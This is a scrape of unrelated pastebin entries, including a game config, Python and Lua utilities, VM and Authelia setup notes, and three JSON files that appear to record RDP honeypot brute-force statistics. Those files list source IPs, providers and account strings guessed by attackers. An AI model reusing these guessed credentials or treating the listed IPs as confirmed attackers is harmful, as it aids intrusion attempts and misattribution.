log_flags SteamUnifiedMessages GCClient SOCache NavMesh RESPONSE_RULES +donotecho
log_flags BuildCubemaps EntityDump UserMessages Decals +donotecho
log_flags Prediction SubtitlesandCaptions ConfigImport CsIconGenerator +donotecho
log_flags UIMapPreviews CSGOgameinstructor Matchmaking RenderPipelineCsgo +donotecho
log_flags RenderPipelineCsgoPostHud Host RESPONSEDOC_LIB +donotecho
log_flags SceneFileCache CSGO_MainMenu +donotecho

echo
echo
echo
echo
echo
echo
echo ""Finished disabling console spam!""
echo
echo
echo
echo
echo
echo

// Now lets log the instructions
echo ""~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~""
echo ""~                                           ~""
echo ""~              Sivert's Config              ~""
echo ""~                 —————————                 ~""
echo ""~                  ———————                  ~""
echo ""~                   —————                   ~""
echo ""~                                           ~""
echo ""~                 eDpi: 520                 ~""
echo ""~                 —————————                 ~""
echo ""~       DPI: 1600                           ~""
echo ""~       Sens: 0.325                         ~""
echo ""~                                           ~""
echo ""~       DPI: 800                            ~""
echo ""~       Sens: 0.65                          ~""
echo ""~                                           ~""
echo ""~       DPI: 400                            ~""
echo ""~       Sens: 1.3                           ~""
echo ""~                                           ~""
echo ""~                   Video                   ~""
echo ""~                 —————————                 ~""
echo ""~       Res: 1280x960                       ~""
echo ""~       Mode: Stretched                     ~""
echo ""~       Hertz: 240                          ~""
echo ""~                                           ~""
echo ""~                  Keybinds                 ~""
echo ""~                 —————————                 ~""
echo ""~       J: Volume 1                         ~""
echo ""~                                           ~""
echo ""~       K: Volume 0.1                       ~""
echo ""~                                           ~""
echo ""~       N: Suicide                          ~""
echo ""~                                           ~""
echo ""~       ALT: Noclip                         ~""
echo ""~                                           ~""
echo ""~       Z: Molotov                          ~""
echo ""~                                           ~""
echo ""~       X: Flashbang                        ~""
echo ""~                                           ~""
echo ""~       C: Grenade                          ~""
echo ""~                                           ~""
echo ""~       T: Smoke                            ~""
echo ""~                                           ~""
echo ""~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~""

// Nades
bind scancode39 ""slot10;+lookatweapon;-lookatweapon"" // US English key name ""0""
bind scancode30 ""slot1"" // US English key name ""1""
bind scancode31 ""slot2"" // US English key name ""2""
bind scancode32 ""slot3"" // US English key name ""3""
bind scancode33 ""slot4;+lookatweapon;-lookatweapon"" // US English key name ""4""
bind scancode34 ""slot5;+lookatweapon;-lookatweapon"" // US English key name ""5""
bind scancode35 ""slot6;+lookatweapon;-lookatweapon"" // US English key name ""6""
bind scancode36 ""slot7;+lookatweapon;-lookatweapon"" // US English key name ""7""
bind scancode37 ""slot8;+lookatweapon;-lookatweapon"" // US English key name ""8""
bind scancode38 ""slot9;+lookatweapon;-lookatweapon"" // US English key name ""9""
bind scancode27 ""slot7;+lookatweapon;-lookatweapon"" // US English key name ""x""
bind scancode29 ""slot10;+lookatweapon;-lookatweapon"" // US English key name ""z""
bind scancode6 ""slot6;+lookatweapon;-lookatweapon"" // US English key name ""c""
bind scancode23 ""slot8;+lookatweapon;-lookatweapon"" // US English key name ""t""

// Sens
sensitivity ""0.325""

// Volume
bind scancode13 ""volume 1"" // US English key name ""j""
bind scancode14 ""volume .1"" // US English key name ""k""

// Training
bind scancode17 ""kill"" // US English key name ""n""
bind scancode226 ""noclip"" // US English key name ""ALT""

// Movement
bind ""MWHEELDOWN"" ""+jump""

// Radar
cl_radar_scale ""0.425""
cl_radar_always_centered ""0""
cl_radar_icon_scale_min "".5""
cl_radar_rotate ""0""
cl_radar_square_with_scoreboard ""1""

// Crosshair
cl_crosshair_drawoutline ""0""
cl_crosshair_dynamic_maxdist_splitratio ""0.300000""
cl_crosshair_dynamic_splitalpha_innermod ""1""
cl_crosshair_dynamic_splitalpha_outermod ""0.5""
cl_crosshair_dynamic_splitdist ""7""
cl_crosshair_friendly_warning ""1""
cl_crosshair_outlinethickness ""0.000000""
cl_crosshair_sniper_width ""1""
cl_crosshair_t ""0""
cl_crosshairalpha ""250""
cl_crosshaircolor ""4""
cl_crosshaircolor_b ""165""
cl_crosshaircolor_g ""255""
cl_crosshaircolor_r ""0""
cl_crosshairdot ""0""
cl_crosshairgap ""-4.000000""
cl_crosshairgap_useweaponvalue ""0""
cl_crosshairsize ""1.000000""
cl_crosshairstyle ""4""
cl_crosshairthickness ""1.000000""
cl_crosshairusealpha ""1""
cl_fixedcrosshairgap ""3""

// HUD
hud_scaling ""0.75""
hud_showtargetid ""1""

// Viewmodel
viewmodel_fov ""68.000000""
viewmodel_offset_x ""2.500000""
viewmodel_offset_y ""0""
viewmodel_offset_z ""-1.500000""
viewmodel_presetpos ""3"""
mMuHhmxM,CSV-JSON-XLSX-READER.py,Najeebsk,Python,Sunday 17th of March 2024 07:21:33 PM CDT,"import tkinter as tk
from tkinter import ttk, filedialog
import pandas as pd

def open_file():
    file_path = filedialog.askopenfilename(filetypes=[(""CSV files"", ""*.csv""), (""Excel files"", ""*.xlsx""), (""JSON files"", ""*.json"")])
    if file_path:
        if file_path.endswith('.csv'):
            df = pd.read_csv(file_path)
        elif file_path.endswith('.xlsx'):
            df = pd.read_excel(file_path)
        elif file_path.endswith('.json'):
            df = pd.read_json(file_path)
        display_data(df)

def display_data(df):
    # Creating a new Frame inside the root window
    frame = ttk.Frame(root)
    frame.pack(fill=tk.BOTH, expand=True)

    # Adding vertical scrollbar
    scrollbar_y = ttk.Scrollbar(frame, orient=tk.VERTICAL)
    scrollbar_y.pack(side=tk.RIGHT, fill=tk.Y)

    # Adding horizontal scrollbar
    scrollbar_x = ttk.Scrollbar(frame, orient=tk.HORIZONTAL)
    scrollbar_x.pack(side=tk.BOTTOM, fill=tk.X)

    # Adding Text widget
    text = tk.Text(frame, yscrollcommand=scrollbar_y.set, xscrollcommand=scrollbar_x.set)
    text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

    # Configuring Scrollbars to work with Text widget
    scrollbar_y.config(command=text.yview)
    scrollbar_x.config(command=text.xview)

    # Inserting data into Text widget
    text.insert(tk.END, df.to_string(index=False))

    # Configuring text color
    text.config(fg=""black"", bg=""white"")

# Main GUI window
root = tk.Tk()
root.title(""File Reader"")

# Changing the background color of root window
root.config(bg=""lightgrey"")

# Adding Open File button
open_button = ttk.Button(root, text=""Open File"", command=open_file)
open_button.pack(pady=10)

# Apply a new theme
style = ttk.Style()
style.theme_use(""clam"")

root.mainloop()
"
4jJ6RwXv,2024-03-17_stats.json,rdp_snitch,JSON,Sunday 17th of March 2024 07:18:10 PM CDT,"{
  ""ip"": {
    ""45.227.254.48"": 6,
    ""71.6.134.230"": 30,
    ""198.235.24.198"": 9,
    ""87.251.75.64"": 3,
    ""87.251.75.145"": 9,
    ""212.70.149.142"": 12,
    ""103.72.57.134"": 9,
    ""84.201.2.2"": 6,
    ""46.19.143.42"": 3,
    ""36.156.22.4"": 6,
    ""103.240.6.155"": 3,
    ""192.3.101.25"": 9,
    ""194.165.16.10"": 3,
    ""185.170.144.3"": 6,
    ""109.205.213.99"": 3,
    ""103.47.194.205"": 3,
    ""194.165.16.72"": 6,
    ""198.235.24.104"": 9,
    ""62.204.41.123"": 18,
    ""84.17.46.162"": 3,
    ""45.227.254.26"": 18,
    ""210.222.64.40"": 3,
    ""71.6.165.200"": 9,
    ""58.218.204.183"": 9,
    ""173.237.25.68"": 3,
    ""152.32.235.90"": 3,
    ""205.210.31.42"": 9,
    ""141.98.81.148"": 3,
    ""198.235.24.186"": 9,
    ""139.144.169.59"": 564
  },
  ""asn"": {
    ""AS267784"": 24,
    ""AS10439"": 39,
    ""AS396982"": 36,
    ""AS208091"": 12,
    ""AS204428"": 12,
    ""AS150892"": 9,
    ""AS44066"": 6,
    ""AS51852"": 3,
    ""AS56046"": 6,
    ""AS151853"": 3,
    ""AS36352"": 9,
    ""AS48721"": 9,
    ""AS197414"": 6,
    ""AS19318"": 3,
    ""AS140832"": 3,
    ""AS59425"": 18,
    ""AS60068"": 3,
    ""AS4766"": 3,
    ""AS4134"": 9,
    ""AS7979"": 3,
    ""AS135377"": 3,
    ""AS209588"": 3,
    ""AS63949"": 564
  },
  ""isp"": {
    ""Flyservers S.A."": 36,
    ""CariNet, Inc."": 39,
    ""Google LLC"": 36,
    ""Xhost Internet Solutions LP"": 18,
    ""SS-Net"": 12,
    ""Gold VPS Limited"": 9,
    ""www.accelerated.de"": 6,
    ""Private Layer INC"": 3,
    ""China Mobile Communications Corporation"": 6,
    ""Giza Network Limited"": 3,
    ""HostPapa"": 9,
    ""Interserver, Inc"": 3,
    ""FTECH"": 3,
    ""Horizon LLC"": 18,
    ""DataCamp Limited"": 3,
    ""KORNET"": 3,
    ""Chinanet"": 9,
    ""Servers.com, Inc."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Akamai Technologies, Inc."": 564
  },
  ""org"": {
    ""UAB Host Baltic"": 24,
    ""CariNet, Inc."": 39,
    ""Palo Alto Networks, Inc"": 36,
    ""Xhost Internet Solutions"": 12,
    ""4Media Ltd"": 12,
    ""Gold VPS Limited"": 9,
    ""diva-e Datacenters GmbH"": 6,
    ""Client1096"": 3,
    ""China Mobile Communications Corporation"": 6,
    ""Giza Network Limited"": 3,
    ""Unknown"": 12,
    ""Flyservers S.A"": 12,
    ""Xhostis"": 6,
    ""RaziNetwork"": 3,
    ""Horizon LLC"": 18,
    ""Cdn77 AMS"": 3,
    ""beomjuhaeun(ju)"": 3,
    ""Chinanet JS"": 9,
    ""Servers.com, Inc."": 3,
    ""Ucloud Information Technology"": 3,
    ""Linode"": 564
  },
  ""regionName"": {
    ""Vilnius"": 24,
    ""Nevada"": 30,
    ""California"": 48,
    ""North Holland"": 21,
    ""Sliven"": 12,
    ""\u00ecnh \u0110\u1ecbnh Province"": 9,
    ""Hesse"": 6,
    ""Zurich"": 3,
    ""Jiangsu"": 15,
    ""Ho Chi Minh"": 3,
    ""New York"": 9,
    ""Kaunas"": 9,
    ""New Jersey"": 3,
    ""Hanoi"": 3,
    ""Moscow"": 18,
    ""Seoul"": 3,
    ""Texas"": 3,
    ""Drenthe"": 3,
    ""Georgia"": 564
  },
  ""country"": {
    ""Lithuania"": 33,
    ""United States"": 657,
    ""The Netherlands"": 24,
    ""Bulgaria"": 12,
    ""Vietnam"": 15,
    ""Germany"": 6,
    ""Switzerland"": 3,
    ""China"": 15,
    ""Russia"": 18,
    ""South Korea"": 3
  },
  ""account"": {
    ""Test"": 42,
    ""eltons"": 15,
    ""administr"": 15,
    ""cBosKhgzm"": 3,
    ""UxmAcb"": 3,
    ""yDhWQE"": 3,
    ""Administr"": 42,
    ""hello"": 33,
    ""nmap"": 6,
    ""Domain"": 21,
    ""kpnYEGPbw"": 3,
    ""WUDcZA"": 3,
    ""uYixme"": 3,
    ""root"": 9,
    ""Administrator"": 144,
    ""RJBJLmPYo"": 3,
    ""VvdzoV"": 3,
    ""pGhVvV"": 3,
    ""lkaHLiLPM"": 3,
    ""HQUYJT"": 3,
    ""bEVEmR"": 3,
    ""Admin"": 141,
    ""Whatuptime.com"": 141,
    ""Jakartakini123#"": 141
  },
  ""keyboard"": {
    ""Unknown"": 786
  },
  ""client_build"": {
    ""Unknown"": 786
  },
  ""client_name"": {
    ""Unknown"": 786
  },
  ""ip_type"": {
    ""Unknown"": 111,
    ""hosting"": 663,
    ""mobile"": 6,
    ""hosting & proxy"": 6
  }
}"
UqRMK5Xi,2024-03-17_stats.json,rdp_snitch,JSON,Sunday 17th of March 2024 07:16:12 PM CDT,"{
  ""ip"": {
    ""45.227.254.48"": 4,
    ""71.6.134.230"": 20,
    ""198.235.24.198"": 6,
    ""87.251.75.64"": 2,
    ""87.251.75.145"": 6,
    ""212.70.149.142"": 8,
    ""103.72.57.134"": 6,
    ""84.201.2.2"": 4,
    ""46.19.143.42"": 2,
    ""36.156.22.4"": 4,
    ""103.240.6.155"": 2,
    ""192.3.101.25"": 6,
    ""194.165.16.10"": 2,
    ""185.170.144.3"": 4,
    ""109.205.213.99"": 2,
    ""103.47.194.205"": 2,
    ""194.165.16.72"": 4,
    ""198.235.24.104"": 6,
    ""62.204.41.123"": 12,
    ""84.17.46.162"": 2,
    ""45.227.254.26"": 12,
    ""210.222.64.40"": 2,
    ""71.6.165.200"": 6,
    ""58.218.204.183"": 6,
    ""173.237.25.68"": 2,
    ""152.32.235.90"": 2,
    ""205.210.31.42"": 6,
    ""141.98.81.148"": 2,
    ""198.235.24.186"": 6,
    ""139.144.169.59"": 376
  },
  ""asn"": {
    ""AS267784"": 16,
    ""AS10439"": 26,
    ""AS396982"": 24,
    ""AS208091"": 8,
    ""AS204428"": 8,
    ""AS150892"": 6,
    ""AS44066"": 4,
    ""AS51852"": 2,
    ""AS56046"": 4,
    ""AS151853"": 2,
    ""AS36352"": 6,
    ""AS48721"": 6,
    ""AS197414"": 4,
    ""AS19318"": 2,
    ""AS140832"": 2,
    ""AS59425"": 12,
    ""AS60068"": 2,
    ""AS4766"": 2,
    ""AS4134"": 6,
    ""AS7979"": 2,
    ""AS135377"": 2,
    ""AS209588"": 2,
    ""AS63949"": 376
  },
  ""isp"": {
    ""Flyservers S.A."": 24,
    ""CariNet, Inc."": 26,
    ""Google LLC"": 24,
    ""Xhost Internet Solutions LP"": 12,
    ""SS-Net"": 8,
    ""Gold VPS Limited"": 6,
    ""www.accelerated.de"": 4,
    ""Private Layer INC"": 2,
    ""China Mobile Communications Corporation"": 4,
    ""Giza Network Limited"": 2,
    ""HostPapa"": 6,
    ""Interserver, Inc"": 2,
    ""FTECH"": 2,
    ""Horizon LLC"": 12,
    ""DataCamp Limited"": 2,
    ""KORNET"": 2,
    ""Chinanet"": 6,
    ""Servers.com, Inc."": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Akamai Technologies, Inc."": 376
  },
  ""org"": {
    ""UAB Host Baltic"": 16,
    ""CariNet, Inc."": 26,
    ""Palo Alto Networks, Inc"": 24,
    ""Xhost Internet Solutions"": 8,
    ""4Media Ltd"": 8,
    ""Gold VPS Limited"": 6,
    ""diva-e Datacenters GmbH"": 4,
    ""Client1096"": 2,
    ""China Mobile Communications Corporation"": 4,
    ""Giza Network Limited"": 2,
    ""Unknown"": 8,
    ""Flyservers S.A"": 8,
    ""Xhostis"": 4,
    ""RaziNetwork"": 2,
    ""Horizon LLC"": 12,
    ""Cdn77 AMS"": 2,
    ""beomjuhaeun(ju)"": 2,
    ""Chinanet JS"": 6,
    ""Servers.com, Inc."": 2,
    ""Ucloud Information Technology"": 2,
    ""Linode"": 376
  },
  ""regionName"": {
    ""Vilnius"": 16,
    ""Nevada"": 20,
    ""California"": 32,
    ""North Holland"": 14,
    ""Sliven"": 8,
    ""\u00ecnh \u0110\u1ecbnh Province"": 6,
    ""Hesse"": 4,
    ""Zurich"": 2,
    ""Jiangsu"": 10,
    ""Ho Chi Minh"": 2,
    ""New York"": 6,
    ""Kaunas"": 6,
    ""New Jersey"": 2,
    ""Hanoi"": 2,
    ""Moscow"": 12,
    ""Seoul"": 2,
    ""Texas"": 2,
    ""Drenthe"": 2,
    ""Georgia"": 376
  },
  ""country"": {
    ""Lithuania"": 22,
    ""United States"": 438,
    ""The Netherlands"": 16,
    ""Bulgaria"": 8,
    ""Vietnam"": 10,
    ""Germany"": 4,
    ""Switzerland"": 2,
    ""China"": 10,
    ""Russia"": 12,
    ""South Korea"": 2
  },
  ""account"": {
    ""Test"": 28,
    ""eltons"": 10,
    ""administr"": 10,
    ""cBosKhgzm"": 2,
    ""UxmAcb"": 2,
    ""yDhWQE"": 2,
    ""Administr"": 28,
    ""hello"": 22,
    ""nmap"": 4,
    ""Domain"": 14,
    ""kpnYEGPbw"": 2,
    ""WUDcZA"": 2,
    ""uYixme"": 2,
    ""root"": 6,
    ""Administrator"": 96,
    ""RJBJLmPYo"": 2,
    ""VvdzoV"": 2,
    ""pGhVvV"": 2,
    ""lkaHLiLPM"": 2,
    ""HQUYJT"": 2,
    ""bEVEmR"": 2,
    ""Admin"": 94,
    ""Whatuptime.com"": 94,
    ""Jakartakini123#"": 94
  },
  ""keyboard"": {
    ""Unknown"": 524
  },
  ""client_build"": {
    ""Unknown"": 524
  },
  ""client_name"": {
    ""Unknown"": 524
  },
  ""ip_type"": {
    ""Unknown"": 74,
    ""hosting"": 442,
    ""mobile"": 4,
    ""hosting & proxy"": 4
  }
}"
1krfGCEN,2024-03-17_stats.json,rdp_snitch,JSON,Sunday 17th of March 2024 07:15:08 PM CDT,"{
  ""ip"": {
    ""45.227.254.48"": 2,
    ""71.6.134.230"": 10,
    ""198.235.24.198"": 3,
    ""87.251.75.64"": 1,
    ""87.251.75.145"": 3,
    ""212.70.149.142"": 4,
    ""103.72.57.134"": 3,
    ""84.201.2.2"": 2,
    ""46.19.143.42"": 1,
    ""36.156.22.4"": 2,
    ""103.240.6.155"": 1,
    ""192.3.101.25"": 3,
    ""194.165.16.10"": 1,
    ""185.170.144.3"": 2,
    ""109.205.213.99"": 1,
    ""103.47.194.205"": 1,
    ""194.165.16.72"": 2,
    ""198.235.24.104"": 3,
    ""62.204.41.123"": 6,
    ""84.17.46.162"": 1,
    ""45.227.254.26"": 6,
    ""210.222.64.40"": 1,
    ""71.6.165.200"": 3,
    ""58.218.204.183"": 3,
    ""173.237.25.68"": 1,
    ""152.32.235.90"": 1,
    ""205.210.31.42"": 3,
    ""141.98.81.148"": 1,
    ""198.235.24.186"": 3,
    ""139.144.169.59"": 188
  },
  ""asn"": {
    ""AS267784"": 8,
    ""AS10439"": 13,
    ""AS396982"": 12,
    ""AS208091"": 4,
    ""AS204428"": 4,
    ""AS150892"": 3,
    ""AS44066"": 2,
    ""AS51852"": 1,
    ""AS56046"": 2,
    ""AS151853"": 1,
    ""AS36352"": 3,
    ""AS48721"": 3,
    ""AS197414"": 2,
    ""AS19318"": 1,
    ""AS140832"": 1,
    ""AS59425"": 6,
    ""AS60068"": 1,
    ""AS4766"": 1,
    ""AS4134"": 3,
    ""AS7979"": 1,
    ""AS135377"": 1,
    ""AS209588"": 1,
    ""AS63949"": 188
  },
  ""isp"": {
    ""Flyservers S.A."": 12,
    ""CariNet, Inc."": 13,
    ""Google LLC"": 12,
    ""Xhost Internet Solutions LP"": 6,
    ""SS-Net"": 4,
    ""Gold VPS Limited"": 3,
    ""www.accelerated.de"": 2,
    ""Private Layer INC"": 1,
    ""China Mobile Communications Corporation"": 2,
    ""Giza Network Limited"": 1,
    ""HostPapa"": 3,
    ""Interserver, Inc"": 1,
    ""FTECH"": 1,
    ""Horizon LLC"": 6,
    ""DataCamp Limited"": 1,
    ""KORNET"": 1,
    ""Chinanet"": 3,
    ""Servers.com, Inc."": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Akamai Technologies, Inc."": 188
  },
  ""org"": {
    ""UAB Host Baltic"": 8,
    ""CariNet, Inc."": 13,
    ""Palo Alto Networks, Inc"": 12,
    ""Xhost Internet Solutions"": 4,
    ""4Media Ltd"": 4,
    ""Gold VPS Limited"": 3,
    ""diva-e Datacenters GmbH"": 2,
    ""Client1096"": 1,
    ""China Mobile Communications Corporation"": 2,
    ""Giza Network Limited"": 1,
    ""Unknown"": 4,
    ""Flyservers S.A"": 4,
    ""Xhostis"": 2,
    ""RaziNetwork"": 1,
    ""Horizon LLC"": 6,
    ""Cdn77 AMS"": 1,
    ""beomjuhaeun(ju)"": 1,
    ""Chinanet JS"": 3,
    ""Servers.com, Inc."": 1,
    ""Ucloud Information Technology"": 1,
    ""Linode"": 188
  },
  ""regionName"": {
    ""Vilnius"": 8,
    ""Nevada"": 10,
    ""California"": 16,
    ""North Holland"": 7,
    ""Sliven"": 4,
    ""\u00ecnh \u0110\u1ecbnh Province"": 3,
    ""Hesse"": 2,
    ""Zurich"": 1,
    ""Jiangsu"": 5,
    ""Ho Chi Minh"": 1,
    ""New York"": 3,
    ""Kaunas"": 3,
    ""New Jersey"": 1,
    ""Hanoi"": 1,
    ""Moscow"": 6,
    ""Seoul"": 1,
    ""Texas"": 1,
    ""Drenthe"": 1,
    ""Georgia"": 188
  },
  ""country"": {
    ""Lithuania"": 11,
    ""United States"": 219,
    ""The Netherlands"": 8,
    ""Bulgaria"": 4,
    ""Vietnam"": 5,
    ""Germany"": 2,
    ""Switzerland"": 1,
    ""China"": 5,
    ""Russia"": 6,
    ""South Korea"": 1
  },
  ""account"": {
    ""Test"": 14,
    ""eltons"": 5,
    ""administr"": 5,
    ""cBosKhgzm"": 1,
    ""UxmAcb"": 1,
    ""yDhWQE"": 1,
    ""Administr"": 14,
    ""hello"": 11,
    ""nmap"": 2,
    ""Domain"": 7,
    ""kpnYEGPbw"": 1,
    ""WUDcZA"": 1,
    ""uYixme"": 1,
    ""root"": 3,
    ""Administrator"": 48,
    ""RJBJLmPYo"": 1,
    ""VvdzoV"": 1,
    ""pGhVvV"": 1,
    ""lkaHLiLPM"": 1,
    ""HQUYJT"": 1,
    ""bEVEmR"": 1,
    ""Admin"": 47,
    ""Whatuptime.com"": 47,
    ""Jakartakini123#"": 47
  },
  ""keyboard"": {
    ""Unknown"": 262
  },
  ""client_build"": {
    ""Unknown"": 262
  },
  ""client_name"": {
    ""Unknown"": 262
  },
  ""ip_type"": {
    ""Unknown"": 37,
    ""hosting"": 221,
    ""mobile"": 2,
    ""hosting & proxy"": 2
  }
}"
NWq5qEei,CSV-XLSX-READER.py,Najeebsk,Python,Sunday 17th of March 2024 07:11:24 PM CDT,"import tkinter as tk
from tkinter import ttk, filedialog
import pandas as pd

def open_file():
    file_path = filedialog.askopenfilename(filetypes=[(""CSV files"", ""*.csv""), (""Excel files"", ""*.xlsx"")])
    if file_path:
        if file_path.endswith('.csv'):
            df = pd.read_csv(file_path)
        elif file_path.endswith('.xlsx'):
            df = pd.read_excel(file_path)
        display_data(df)

def display_data(df):
    # Creating a new Frame inside the root window
    frame = ttk.Frame(root)
    frame.pack(fill=tk.BOTH, expand=True)

    # Adding vertical scrollbar
    scrollbar_y = ttk.Scrollbar(frame, orient=tk.VERTICAL)
    scrollbar_y.pack(side=tk.RIGHT, fill=tk.Y)

    # Adding horizontal scrollbar
    scrollbar_x = ttk.Scrollbar(frame, orient=tk.HORIZONTAL)
    scrollbar_x.pack(side=tk.BOTTOM, fill=tk.X)

    # Adding Text widget
    text = tk.Text(frame, yscrollcommand=scrollbar_y.set, xscrollcommand=scrollbar_x.set)
    text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

    # Configuring Scrollbars to work with Text widget
    scrollbar_y.config(command=text.yview)
    scrollbar_x.config(command=text.xview)

    # Inserting data into Text widget
    text.insert(tk.END, df.to_string(index=False))

    # Configuring text color
    text.config(fg=""black"", bg=""white"")

# Main GUI window
root = tk.Tk()
root.title(""File Reader"")

# Changing the background color of root window
root.config(bg=""lightgrey"")

# Adding Open File button
open_button = ttk.Button(root, text=""Open File"", command=open_file)
open_button.pack(pady=10)

# Apply a new theme
style = ttk.Style()
style.theme_use(""clam"")

root.mainloop()
"
mznMd2L6,Untitled,Yobanzda,Lua,Sunday 17th of March 2024 07:08:37 PM CDT,VERSION: novatag1
h96ihZqi,QEMU Debian server with port forwarding,metalx1000,Bash,Sunday 17th of March 2024 07:03:42 PM CDT,"sudo apt install qemu-system

# get image
wget ""https://cloud.debian.org/images/cloud/bookworm/latest/debian-12-nocloud-amd64.qcow2""

# start VM with port forwarding
qemu-system-x86_64 -enable-kvm -m 1G -hda debian-12-nocloud-amd64.qcow2 -nic user,hostfwd=tcp::5022-:22

#in VM
apt update
apt install -y gpm nmap
apt reinstall openssh-server

adduser newuser

# set PasswordAuthentication yes
vim /etc/ssh/sshd_config

/etc/init.d/sshd restart

# webserver
# start VM with port forwarding
qemu-system-x86_64 -enable-kvm -m 1G -hda debian-12-nocloud-amd64.qcow2 -nic user,hostfwd=tcp::5080-:80

apt install apache2

# headless
qemu-system-x86_64 -enable-kvm -m 1G -hda debian-12-nocloud-amd64.qcow2 -nic user,hostfwd=tcp::5080-:80 -nographic

# both ports forwarded
qemu-system-x86_64 -enable-kvm -m 1G -hda debian-12-nocloud-amd64.qcow2 -nic user,hostfwd=tcp::5080-:80,hostfwd=tcp::5022-:22 -nographic"
bs8XVgyv,crystal crafter,Swat_,Lua,Sunday 17th of March 2024 06:39:35 PM CDT,"backpack = peripheral.wrap(""create:item_vault_0"")
monitor = peripheral.find(""monitor"")
monitorWidth = monitor.getSize()
 
function craft()
    local items = backpack.list()
    local amount = 0
 
    for key, value in pairs(items) do
        amount = amount + value.count
    end
    
    
    local avg = math.floor(amount / 9)
    
    if (avg > 64) then
        avg = 64
    end
    
    printWrapString(wrapString(monitorWidth, amount .. "" dust in inventory""))
    if (avg < 1) then
        printWrapString(wrapString(monitorWidth, ""Not enough dust to craft.""))
        sleep(2)
        return
    end
 
    local _, cursor = monitor.getCursorPos()
    monitor.setCursorPos(1, cursor + 1)
    craftingProgress = ""+ "" .. avg .. "" gems""
    monitor.write(craftingProgress)
    for i=1,11 do
        if (i ~= 4 and i ~= 8) then
            turtle.select(i)
            turtle.suck(avg)
            monitor.clearLine();
            monitor.setCursorPos(1, cursor + 1)
            craftingProgress = craftingProgress .. "".""
            monitor.write(craftingProgress)
        end
    end
    turtle.craft()
    turtle.dropUp()
end

function printWrapString(wrapString)
    local _, cursor = monitor.getCursorPos()
    for i, text in pairs(wrapString) do
        cursor = cursor + 1
        monitor.setCursorPos(1, cursor)
        monitor.write(text)
    end
end

function wrapString(wrapSize, text)
    local stringArray = {}
    local len = text:len()
 
    for i = 0, len, wrapSize do
        table.insert(stringArray, text:sub(i, i + wrapSize))
    end
    return stringArray
end

monitor.setTextScale(0.5)

while true do
    monitor.clear()
    monitor.setCursorPos(1, 1)
    craft()
end"
JXwEkKt0,Pastes.io - New Pastebin,xxsa,PHP,Sunday 17th of March 2024 06:10:06 PM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Simple Ads by Google Adsense Few rather than Pastebin
150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Embed, download, print pastes
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes
Trending pastes page (day, week, month, year)
No Captcha for logged in users feature
Simple Ads by Google Adsense Few rather than Pastebin"
LSkYfABp,authelia config,kindrudekid,YAML,Sunday 17th of March 2024 05:53:36 PM CDT,"# Server Config
server:
  address: ""tcp://0.0.0.0:9091/authelia""
  buffers:
    read: 4096
    write: 4096
  endpoints:
    authz:
      auth-request:
        implementation: 'AuthRequest'
          #authn_strategies:
          #- name: 'HeaderAuthRequestProxyAuthorization'
          #  schemes:
          #    - 'Basic'
          #- name: 'CookieSession'
  timeouts:
    read: '6s'
    write: '6s'
    idle: '30s'

# Log config
log:
  level: debug
  format: text
  file_path: ""/config/authelia.log""
  keep_stdout: false
  #log_format: json


# 2FA Config

# TOTP Config
totp:
  disable: false
  issuer: example.com
  algorithm: sha256
  digits: 6
  period: 30
  skew: 1
  secret_size: 32

# Authelia Backend
authentication_backend:
  password_reset:
    disable: false
    custom_url: """"
  file:
    path: /config/users_database.yml
    password:
      algorithm: argon2id
      iterations: 1
      key_length: 32
      salt_length: 16
      memory: 512
      parallelism: 8

# Access Control for domains
access_control:
  rules:
    # Allow free access from local network
    - domain:
      - example.com
      - ""*.example.com""
      networks:
        - 192.168.0.44/32
        - 76.183.182.193/32
      policy: one_factor
    - domain:
      - example.com
      - ""*.example.com""
      policy: two_factor
  default_policy: deny



# Session Info
session:
  name: authelia_session
  secret: RANDOMDATA
  expiration: 8h
  inactivity: 5m
  remember_me: 1w
  same_site: lax
  cookies:
    - domain: 'example.com'
      authelia_url: 'https://authelia.example.com'
      name: 'authelia_session2'
      #default_redirection_url: 'https://heimdall.example.com'

identity_validation:
  reset_password:
    jwt_lifespan: '5 minutes'
    jwt_algorithm: 'HS256'
    jwt_secret: 'RANDOMDATA'

# regulation

regulation:
  max_retries: 3
  find_time: 2m
  ban_time: 5m
storage:
  encryption_key: RANDOMDATA
  local:
    path: /config/db.sqlite3
notifier:
  # You can disable the notifier startup check by setting this to true.
  disable_startup_check: false

  # For testing purpose, notifications can be sent in a file.
  filesystem:
    filename: /config/notification.txt"
tG6w8Nf6,Untitled,dereksir,Python,Sunday 17th of March 2024 05:49:11 PM CDT,"#...

# intialize uc instance with configured options
driver = uc.Chrome(options=options)
 
# navigate to target website
driver.get('https://httpbin.io/ip')

# retrieve text content of the page
textContent = driver.find_element(By.TAG_NAME, 'body').text
print(textContent)
 
driver.quit()"
U8jXYpRk,psi idle work,KukuRuzo,C++,Sunday 17th of March 2024 05:44:49 PM CDT,"diff --git a/src/tools/idle/idle_x11.cpp b/src/tools/idle/idle_x11.cpp
index d50cc3d4..1874629c 100644
--- a/src/tools/idle/idle_x11.cpp
+++ b/src/tools/idle/idle_x11.cpp
@@ -21,10 +21,13 @@
 
 #ifdef HAVE_XSS
 #include <QApplication>
-#include <QDesktopWidget>
+#include ""x11windowsystem.h""
+#if QT_VERSION < QT_VERSION_CHECK(6, 0, 0)
 #include <QX11Info>
+#else
+#include <QGuiApplication>
+#endif
 #include <X11/Xlib.h>
-#include <X11/Xutil.h>
 #include <X11/extensions/scrnsaver.h>
 
 static XErrorHandler old_handler = 0;
@@ -107,7 +110,7 @@ bool IdlePlatform::init()
     }
 #endif // USE_DBUS
 #ifdef HAVE_XSS
